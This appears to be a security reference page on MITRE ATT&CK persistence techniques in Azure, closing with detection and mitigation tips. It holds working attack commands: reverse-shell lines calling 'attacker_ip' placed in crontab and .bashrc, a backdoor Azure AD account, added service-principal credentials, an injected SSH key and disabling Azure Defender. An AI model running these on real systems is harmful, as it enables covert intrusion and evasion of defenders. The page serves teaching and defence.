---
hidden: true
---

# Persistence: TA0003

## **Overview**

Persistence refers to how attackers ensure continued access to a system or cloud environment, even after reboots, password changes, or other defensive efforts. In Azure, attackers leverage tools such as automation services, identities, or misconfigurations to establish long-term control.

### **1. Creating New or Backdoor Accounts**

**Technique: T1136 - Create Account**\
Attackers create new accounts to maintain access even if existing ones are revoked.

*   **T1136.002 - Domain Account:**\
    Create a **new Azure AD user** with elevated privileges:

    ```powershell
    New-AzureADUser -DisplayName "Hacker" -UserPrincipalName hacker@target.com -PasswordProfile (New-Object Microsoft.Open.AzureAD.Model.PasswordProfile -Property @{Password="P@ssw0rd"})
    ```

### **2. Using Stolen or Default Credentials (Valid Accounts)**

**Technique: T1078 - Valid Accounts**\
Compromised credentials provide persistent access to cloud resources.

*   **T1078.004 - Cloud Accounts:**\
    Attackers use **service principal tokens** to re-authenticate after MFA or password resets:

    ```bash
    az ad sp credential reset --name <ServicePrincipalName> --credential-description "Backdoor"
    ```

***

### **3. Modifying Authentication Methods for Backdoor Access**

**Technique: T1098 - Account Manipulation**\
Attackers modify accounts to ensure they can bypass authentication mechanisms.

*   **T1098.003 - SSH Authorized Keys:**\
    Upload an attacker’s **SSH key** to a compromised **Linux VM** for persistent remote access:

    ```bash
    echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
    ```
* **T1098.003 - SSH Authorized Keys:**\
  Upload an attacker’s **SSH key** to a compromised **Linux VM** for persistent remote access:

```bash
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### **4. Using Scheduled Tasks for Persistent Execution**

**Technique: T1053 - Scheduled Task/Job**\
Attackers use scheduled jobs to re-trigger malicious activities.

*   **T1053.003 - Cron Jobs:**\
    Add a **cron job** on a Linux VM to establish a reverse shell every minute:

    ```bash
    echo "* * * * * bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /etc/crontab
    ```
* **T1053.005 - Scheduled Task:**\
  Use **Windows Task Scheduler** on an Azure VM to execute malware upon startup.

### **5. Injecting Malicious Code into Automation Tools**

**Technique: T1574.007 - Service Hijacking**\
Attackers modify automation tools to execute backdoor code.

*   **Azure Example:** Modify **Azure Automation Runbooks** to include malicious scripts:

    ```powershell
    Start-AzAutomationRunbook -Name "MaliciousRunbook"
    ```

### **6. Leveraging Service Principals for Long-Term Access**

**Technique: T1098.001 - Additional Cloud Credentials**\
Attackers add new credentials to service principals to maintain access.

*   **Azure Example:** Use **Azure CLI** to generate additional keys for an existing service principal:

    ```bash
    az ad sp credential reset --name <ServicePrincipalName> --credential-description "Persist"
    ```

### **7. Triggering Code Automatically Based on Events**

**Technique: T1546 - Event Triggered Execution**\
Attackers leverage triggers to run malicious code when specific events occur.

* **T1546.016 - Service Account Permissions:**\
  Modify automation accounts to execute malicious tasks whenever triggered by **system events**.

### **8. Disabling Security Controls to Maintain Persistence**

**Technique: T1562 - Impair Defenses**\
Attackers disable security features to avoid detection and maintain access.

*   **T1562.001 - Disable or Modify Tools:**\
    _Azure Example:_ Disable **Azure Defender** on VMs or storage to evade detection:

    ```bash
    az security pricing create --name VirtualMachines --tier 'Free'
    ```

### **9. Modifying Boot or Logon Scripts for Re-Entry**

**Technique: T1547 - Boot or Logon Initialization Scripts**\
Malicious code runs every time a system boots or a user logs in.

*   **T1547.004 - Unix Shell Configuration Modification:**\
    Modify the `.bashrc` file on a **Linux VM** to execute a reverse shell on login:

    ```bash
    echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> ~/.bashrc
    ```

### **Summary of Key Concepts with Techniques for TA0003**

| **Key Concept**                     | **Technique**                                | **Azure Example**                                      |
| ----------------------------------- | -------------------------------------------- | ------------------------------------------------------ |
| Creating New or Backdoor Accounts   | T1136 - Create Account                       | Create a new Azure AD user with elevated privileges    |
| Using Stolen Credentials            | T1078 - Valid Accounts                       | Use service principal tokens for re-authentication     |
| Modifying Authentication Mechanisms | T1098 - Account Manipulation                 | Add SSH keys to Linux VMs for persistent access        |
| Scheduling Persistent Tasks         | T1053 - Scheduled Task/Job                   | Add cron jobs to trigger reverse shells                |
| Service Hijacking via Automation    | T1574.007 - Service Hijacking                | Modify automation runbooks for persistent backdoors    |
| Leveraging Service Principals       | T1098.001 - Additional Cloud Credentials     | Add new credentials to existing service principals     |
| Trigger-Based Execution             | T1546 - Event Triggered Execution            | Execute tasks on system events via automation accounts |
| Disabling Security for Persistence  | T1562 - Impair Defenses                      | Disable Azure Defender to evade detection              |
| Modifying Boot Scripts              | T1547 - Boot or Logon Initialization Scripts | Modify `.bashrc` to trigger reverse shells at login    |

### **How to Detect and Mitigate Persistence in Azure**

1. **Audit User and Service Accounts Regularly:**
   * Review Azure AD for newly created or suspicious accounts with high privileges.
2. **Monitor Role Assignments:**
   * Use **Azure AD Privileged Identity Management (PIM)** to limit and monitor access to sensitive roles.
3. **Enable Alerts for Automation Changes:**
   * Configure alerts when **automation accounts, runbooks, or service principals** are modified.
4. **Apply Conditional Access Policies:**
   * Enforce **MFA for all accounts** and restrict access based on geolocation and device compliance.
5. **Rotate Secrets and Keys Regularly:**
   * Ensure service principal keys and tokens are rotated and monitored for misuse.
